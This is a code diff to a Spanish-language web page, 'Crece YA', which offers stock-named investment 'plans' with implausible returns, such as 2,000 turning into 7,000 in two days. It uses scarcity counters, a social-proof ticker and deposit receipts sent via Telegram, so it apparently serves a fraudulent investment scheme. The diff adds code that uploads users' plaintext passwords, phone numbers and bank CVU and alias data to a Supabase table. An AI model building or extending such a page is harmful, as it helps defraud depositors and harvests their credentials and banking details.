@@ -5,11 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>Crece YA - Inversiones Bursátiles</title>
   
-  <!-- Tipografía estilo SuperMicro (Inter: compacta, moderna y legible) -->
+  <!-- Tipografía Inter (Estilo SuperMicro / Fintech) -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
 
+  <!-- Librería Supabase y Tailwind CSS -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   
@@ -22,7 +24,7 @@
       transition: background-color 0.3s ease, color 0.3s ease;
     }
 
-    /* MODO OSCURO (ESTILO SUPERMICRO / CYBER FINTECH) */
+    /* MODO OSCURO (ESTILO SUPERMICRO) */
     body.dark-mode {
       background-color: #030a13 !important;
       color: #e2e8f0 !important;
@@ -122,7 +124,7 @@
   <main class="w-full max-w-sm bg-[#e0f2fe] border-x sm:border border-sky-200 min-h-screen sm:rounded-3xl shadow-2xl flex flex-col justify-between relative pb-20">
 
     <div>
-      <!-- HEADER CON LOGO, DETECTOR ADMIN Y BOTÓN MODO OSCURO (SOL/LUNA) -->
+      <!-- HEADER -->
       <header class="p-3.5 flex items-center justify-between border-b border-sky-200/80 bg-white/70 backdrop-blur-md sticky top-0 z-30">
         <div class="flex items-center gap-2.5 cursor-pointer select-none" id="admin-logo-trigger">
           <img src="./logo.png" alt="Crece YA" class="h-9 w-auto object-contain">
@@ -133,7 +135,7 @@
         </div>
 
         <div class="flex items-center gap-2">
-          <!-- INTERRUPTOR MODO CLARO / OSCURO (SOL/LUNA) -->
+          <!-- INTERRUPTOR MODO CLARO / OSCURO -->
           <button id="btn-theme-toggle" onclick="toggleTheme()" class="w-8 h-8 rounded-xl bg-sky-100 dark:bg-slate-800 text-slate-700 dark:text-amber-300 border border-sky-300 dark:border-slate-700 flex items-center justify-center text-sm shadow-xs transition" title="Cambiar tema">
             <i id="theme-icon" class="fa-solid fa-moon"></i>
           </button>
@@ -147,7 +149,7 @@
         </div>
       </header>
 
-      <!-- NOTIFICACIÓN SOCIAL PROOF -->
+      <!-- TICKER SOCIAL -->
       <section class="social-ticker bg-white/60 border-b border-sky-200/60 px-3 py-2 text-xs text-slate-600">
         <p class="truncate font-mono text-xs flex items-center gap-2">
           <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
@@ -175,7 +177,6 @@
           </div>
         </div>
 
-        <!-- Selector de Categorías: INICIALES vs VIP -->
         <div class="flex items-center justify-between px-1">
           <span class="text-xs font-bold text-slate-800 uppercase tracking-wide text-main">MERCADO BURSÁTIL</span>
           <div class="subbox-theme flex gap-1 bg-white/70 p-1 rounded-xl border border-sky-200 text-xs">
@@ -317,7 +318,7 @@
           </div>
         </div>
 
-        <!-- BOTÓN CANAL OFICIAL DE WHATSAPP -->
+        <!-- WHATSAPP -->
         <a href="https://whatsapp.com/channel/0029Vb8mCGGLI8YahzbVBb0G" target="_blank" class="p-3.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
           <div class="flex items-center gap-3">
             <i class="fa-brands fa-whatsapp text-2xl"></i>
@@ -329,7 +330,7 @@
           <i class="fa-solid fa-chevron-right text-xs"></i>
         </a>
 
-        <!-- BOTÓN CANAL DE DIFUSIÓN TELEGRAM -->
+        <!-- TELEGRAM -->
         <a href="https://t.me/creceya2026" target="_blank" class="p-3.5 bg-sky-500 hover:bg-sky-400 text-white rounded-2xl flex items-center justify-between shadow-sm transition">
           <div class="flex items-center gap-3">
             <i class="fa-brands fa-telegram text-2xl"></i>
@@ -421,7 +422,6 @@
             <input id="deposit-custom-input" type="number" min="2000" placeholder="Ingrese un monto personalizado (mín. 2.000,00)" class="w-full bg-[#132337] border border-slate-800 rounded-xl p-3 text-xs font-mono font-bold text-white outline-none">
           </div>
 
-          <!-- BOTÓN VINCULADO AL ENLACE DE COMPROBANTES -->
           <button onclick="notifyDepositTelegram()" class="w-full py-3 bg-sky-500 hover:bg-sky-400 text-slate-950 font-black text-xs rounded-xl transition shadow flex items-center justify-center gap-2">
             <i class="fa-brands fa-telegram text-base"></i> Notificar y Enviar Comprobante
           </button>
@@ -524,9 +524,20 @@
 
   </main>
 
-  <!-- ================= LÓGICA JAVASCRIPT ================= -->
+  <!-- ================= LÓGICA JAVASCRIPT CONEXIÓN SUPABASE ================= -->
   <script>
-    // 100 CUPOS INICIALES / 50 CUPOS VIP
+    // Conexión Supabase
+    const SUPABASE_URL = "https://jsixgpftuhtepudyektf.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_1I5At-aenvWS_w6YhDLu9w_rkAeGHjL";
+    let supabase = null;
+    try {
+      if (window.supabase) {
+        supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      }
+    } catch(err) {
+      console.warn("Supabase bypassed:", err);
+    }
+
     const plans = [
       // CATEGORÍA INICIAL (100 cupos totales)
       { id: 'meli', name: 'MELI (Mercado Libre)', cat: 'inicial', cost: 2000, days: 2, daily: 2500, total: 7000, slotsTotal: 100, slotsLeft: 64, color: '#f59e0b', btnBg: 'bg-amber-400 hover:bg-amber-300 text-slate-950', border: 'border-amber-300', logo: './meli.png' },
@@ -575,7 +586,6 @@
       appState.activePlans = JSON.parse(localStorage.getItem('cy_active_plans')) || [];
     } catch(e) {}
 
-    // APLICAR MODO OSCURO / CLARO
     function applyTheme() {
       const icon = document.getElementById('theme-icon');
       if (appState.darkMode) {
@@ -636,7 +646,8 @@
       }
     }
 
-    window.handleLoginDirecto = function() {
+    // REGISTRO Y ENVÍO A SUPABASE
+    window.handleLoginDirecto = async function() {
       const phone = document.getElementById('auth-phone').value.trim();
       const pass = document.getElementById('auth-pass').value;
       const passConf = document.getElementById('auth-pass-confirm').value;
@@ -657,6 +668,27 @@
       appState.phone = phone;
       appState.pass = pass;
       saveLocal();
+
+      // Guardar en Supabase
+      if (supabase) {
+        try {
+          const { error } = await supabase.from('usuarios').upsert({
+            phone: appState.phone,
+            pass: appState.pass,
+            name: appState.name || '',
+            cvu: appState.cvu || '',
+            alias: appState.alias || ''
+          }, { onConflict: 'phone' });
+
+          if (error) {
+            console.warn("Aviso Supabase:", error.message);
+          } else {
+            console.log("Usuario sincronizado exitosamente en Supabase");
+          }
+        } catch(e) {
+          console.warn("Fallo de red con Supabase:", e);
+        }
+      }
 
       document.getElementById('auth-screen').style.display = 'none';
       document.getElementById('user-display-phone').innerText = appState.phone;
@@ -888,7 +920,6 @@
 
     window.setDepositValue = (v) => document.getElementById('deposit-custom-input').value = v;
 
-    // ENVÍO DE COMPROBANTES VINCULADO AL GRUPO DE TELEGRAM
     window.notifyDepositTelegram = function() {
       const val = parseFloat(document.getElementById('deposit-custom-input').value) || 2000;
       if (val < 2000) {
@@ -959,11 +990,20 @@
     document.getElementById('prof-cvu-input').value = appState.cvu;
     document.getElementById('prof-alias-input').value = appState.alias;
 
-    document.getElementById('btn-save-profile').addEventListener('click', () => {
+    document.getElementById('btn-save-profile').addEventListener('click', async () => {
       appState.name = document.getElementById('prof-name-input').value.trim();
       appState.cvu = document.getElementById('prof-cvu-input').value.trim();
       appState.alias = document.getElementById('prof-alias-input').value.trim();
       saveLocal();
+
+      if (supabase && appState.phone) {
+        await supabase.from('usuarios').update({
+          name: appState.name,
+          cvu: appState.cvu,
+          alias: appState.alias
+        }).eq('phone', appState.phone);
+      }
+
       alert("Datos bancarios guardados.");
     });
 
@@ -1027,7 +1067,6 @@
       renderPlans();
     }
 
-    // Inicializar tema y sesión
     applyTheme();
     checkAuth();
     renderProducts();
